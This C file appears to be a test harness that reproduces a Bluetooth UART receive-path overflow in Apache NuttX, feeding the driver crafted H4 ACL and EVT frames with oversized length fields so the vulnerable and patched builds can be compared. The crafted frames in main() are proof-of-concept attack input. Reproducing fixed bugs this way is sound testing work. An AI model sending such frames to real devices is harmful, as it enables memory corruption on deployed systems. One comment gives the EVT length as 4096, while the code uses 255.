/*
 * bt_uart_harness.c
 *
 * Host harness for the Apache NuttX Bluetooth UART driver receive path.
 * The functions under test, btuart_read() and btuart_rxwork(), are the
 * verbatim upstream sources (see the two .inc extracts: the nuttx-12.7.0
 * tag for the vulnerable build, the nuttx-12.9.0 tag for the fixed
 * build). The vulnerability in the 12.7.x code became CVE-2025-35003;
 * PR apache/nuttx#16179 added the bounds check.
 *
 * NuttX-specific glue is stubbed so the code builds with a host
 * compiler: the lower-half UART callbacks become an in-memory byte
 * queue, and bt_netdev_receive() becomes a sink that reports the
 * (hdrlen + pktlen) the Bluetooth stack was about to be handed.
 *
 * Build:  make
 * Run:    ./bt_uart_harness acl        (ACL frame with len=4096, overflow)
 *         ./bt_uart_harness evt        (EVT frame with len=4096, overflow)
 *         ./bt_uart_harness_fixed acl  (same input, patched code)
 */

#include <assert.h>
#include <stddef.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>

#include "nuttx_net_bluetooth_sizes.h"

#define CONFIG_BLUETOOTH_UART_RXBUFSIZE 2048
#define H4_HEADER_SIZE  1
#define H4_ACL 0x02
#define H4_EVT 0x04
#define BT_DUMP(a, ...) ((void)0)

#define wlwarn(...) fprintf(stderr, __VA_ARGS__)
#define wlerr(...) fprintf(stderr, __VA_ARGS__)
#define wlinfo(...) ((void)0)
#define FAR
#define DEBUGASSERT(x) assert(x)

struct bt_hci_evt_hdr_s { uint8_t evt; uint8_t len; };
struct bt_hci_acl_hdr_s { uint16_t handle; uint16_t len; };

enum bt_buf_type_e { BT_CMD, BT_ACL_IN, BT_SCO, BT_ISO_IN, BT_EVT };

/* ------------------------------------------------------------------ */
/* Simulated lower half: a UART fed from an in-memory byte queue.      */
/* ------------------------------------------------------------------ */

struct feed {
  const uint8_t *data;
  size_t len;
  size_t pos;
};

struct btuart_lowerhalf_s {
  ssize_t (*read)(FAR const struct btuart_lowerhalf_s *lower,
                  FAR uint8_t *buffer, size_t buflen);
  struct feed *feed;
};

static ssize_t sim_read(FAR const struct btuart_lowerhalf_s *lower,
                        FAR uint8_t *buffer, size_t buflen)
{
  struct feed *f = lower->feed;
  size_t n = f->len - f->pos;
  if (n > buflen) n = buflen;
  memcpy(buffer, f->data + f->pos, n);
  f->pos += n;
  return (ssize_t)n;
}

struct bt_driver_s { int dummy; };

static void bt_netdev_receive(FAR struct bt_driver_s *dev,
                              enum bt_buf_type_e type,
                              FAR void *data, size_t len)
{
  printf("[stack] bt_netdev_receive(type=%d, hdrlen+pktlen=%zu)\n",
         type, len);
}

struct btuart_upperhalf_s {
  struct bt_driver_s dev;
  const struct btuart_lowerhalf_s *lower;
  bool busy;
};

/* ------------------------------------------------------------------ */
/* Upstream code under test.                                           */
/* ------------------------------------------------------------------ */

#include BT_UNDER_TEST_FILE

/* ------------------------------------------------------------------ */
/* Craft the malicious H4 stream and pump the work function.           */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "acl";

  /* An H4 ACL frame declaring a 4096 byte payload: 0x02, the 4 byte
   * ACL header with len=0x1000, then 4096 filler bytes. A malicious or
   * compromised BT controller (or anyone with access to the UART
   * signal) can emit this while the host sits idle; the driver reads
   * the declared length before any check.
   */
  static uint8_t acl[1 + 4 + 4096];
  static uint8_t evt[1 + 2 + 4096];

  acl[0] = 0x02;                         /* H4_ACL  */
  acl[1] = 0xff; acl[2] = 0x0f;          /* handle  = 0x0fff          */
  acl[3] = 0x00; acl[4] = 0x10;          /* acl.len = 0x1000 = 4096   */
  memset(acl + 5, 0x41, sizeof(acl) - 5);

  evt[0] = 0x04;                         /* H4_EVT */
  evt[1] = 0x3e; evt[2] = 0xff;          /* event 0x3e, len 255         */
  memset(evt + 3, 0x42, sizeof(evt) - 3);

  struct feed f;
  struct btuart_lowerhalf_s lower = { sim_read, &f };
  struct btuart_upperhalf_s upper = { {0}, &lower, false };

  if (strcmp(mode, "acl") == 0)
    {
      f.data = acl; f.len = sizeof(acl); f.pos = 0;
      printf("[test] feeding ACL frame with acl.len=4096 into "
             "btuart_rxwork\n");
      btuart_rxwork(&upper);
      printf("[test] rxwork returned\n");
    }
  else if (strcmp(mode, "evt") == 0)
    {
      f.data = evt; f.len = sizeof(evt); f.pos = 0;
      printf("[test] feeding EVT frame with hdr.len=255\n");
      btuart_rxwork(&upper);
      printf("[test] rxwork returned\n");
    }
  else
    {
      fprintf(stderr, "usage: %s {acl|evt}\n", argv[0]);
      return 2;
    }

  return 0;
}
